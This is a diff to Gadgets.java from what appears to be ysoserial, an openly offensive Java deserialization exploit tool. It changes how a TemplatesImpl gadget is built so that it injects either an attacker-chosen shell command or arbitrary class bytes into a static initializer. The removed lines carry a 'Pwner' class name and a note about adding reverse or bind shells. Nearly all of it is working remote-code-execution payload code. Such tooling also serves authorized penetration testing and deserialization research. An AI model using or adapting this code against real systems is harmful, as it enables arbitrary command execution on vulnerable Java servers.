@@ -13,7 +13,10 @@ import javassist.ClassPool;
 import javassist.CtClass;
 
 import java.io.Serializable;
-import java.lang.reflect.*;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -23,9 +26,7 @@ import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIA
 /*
  * utility generator functions for common jdk-only gadgets
  */
-@SuppressWarnings({
-    "restriction", "rawtypes", "unchecked"
-})
+@SuppressWarnings({"restriction", "rawtypes", "unchecked"})
 public class Gadgets {
 
     public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
@@ -63,58 +64,69 @@ public class Gadgets {
 
     public static Object createTemplatesImpl(final String command) throws Exception {
         if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
-            return createTemplatesImpl(null,
-                command,
-                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
-                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
-                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+            return createTemplatesImpl(null, command, null, Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
         }
 
-        return createTemplatesImpl(null, command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+        return createTemplatesImpl(null, command, null, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
     public static Object createTemplatesImpl(final Class clazz) throws Exception {
         if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
-            return createTemplatesImpl(clazz,
-                "",
-                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
-                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
-                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+            return createTemplatesImpl(clazz, null, null,
+
+                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
         }
 
-        return createTemplatesImpl(clazz, null, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+        return createTemplatesImpl(clazz, null, null, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
-    public static <T> T createTemplatesImpl(Class myClass, final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
-        throws Exception {
-        final T templates = tplClass.newInstance();
-        byte[] classBytes = new byte[0];
-
-        if (myClass == null) {
-            // use template gadget class
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
-            pool.insertClassPath(new ClassClassPath(abstTranslet));
-            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-            // run command in static initializer
-            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-            String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
-                "\");";
-            clazz.makeClassInitializer().insertAfter(cmd);
-            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-            clazz.setName("ysoserial.Pwner" + System.nanoTime());
-            CtClass superC = pool.get(abstTranslet.getName());
-            clazz.setSuperclass(superC);
-            classBytes = clazz.toBytecode();
-        } else {
-            classBytes = ClassFiles.classAsBytes(myClass);
+    public static Object createTemplatesImpl(final byte[] bytes) throws Exception {
+        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
+            return createTemplatesImpl(null, null, bytes, Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
         }
 
+        return createTemplatesImpl(null, null, bytes, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+    }
+
+    public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
+        final T templates = tplClass.newInstance();
+        byte[] classBytes = new byte[0];
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass;
+        if (command != null) {
+            ctClass = pool.get("ysoserial.payloads.templates.CommandTemplate");
+            pool.insertClassPath(new ClassClassPath(abstTranslet));
+            ctClass.setName(ctClass.getName() + System.nanoTime());
+            String cmd = "cmd = \"" + command + "\";";
+            ctClass.makeClassInitializer().insertBefore(cmd);
+            CtClass superC = pool.get(abstTranslet.getName());
+            ctClass.setSuperclass(superC);
+            classBytes = ctClass.toBytecode();
+        }
+        if (myClass != null) {
+            // CLASS:
+            classBytes = ClassFiles.classAsBytes(myClass);
+        }
+        if (bytes != null) {
+            // FILE:
+            ctClass = pool.get("ysoserial.payloads.templates.ClassLoaderTemplate");
+            ctClass.setName(ctClass.getName() + System.nanoTime());
+            StringBuffer sb = new StringBuffer();
+            for (int i = 0; i < bytes.length; i++) {
+                sb.append(bytes[i]);
+                if (i != bytes.length - 1) sb.append(",");
+            }
+            String content = "bs = new byte[]{" + sb + "};";
+            // System.out.println(content);
+            ctClass.makeClassInitializer().insertBefore(content);
+            CtClass superC = pool.get(abstTranslet.getName());
+            ctClass.setSuperclass(superC);
+            classBytes = ctClass.toBytecode();
+        }
+
+
         // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
-            classBytes, ClassFiles.classAsBytes(Foo.class)
-        });
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Foo.class)});
 
         // required to make TemplatesImpl happy
         Reflections.setFieldValue(templates, "_name", "Pwnr");
@@ -122,8 +134,7 @@ public class Gadgets {
         return templates;
     }
 
-    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
-        IllegalAccessException, InvocationTargetException {
+    public static HashMap makeMap(Object v1, Object v2) throws Exception {
         HashMap s = new HashMap();
         Reflections.setFieldValue(s, "size", 2);
         Class nodeC;
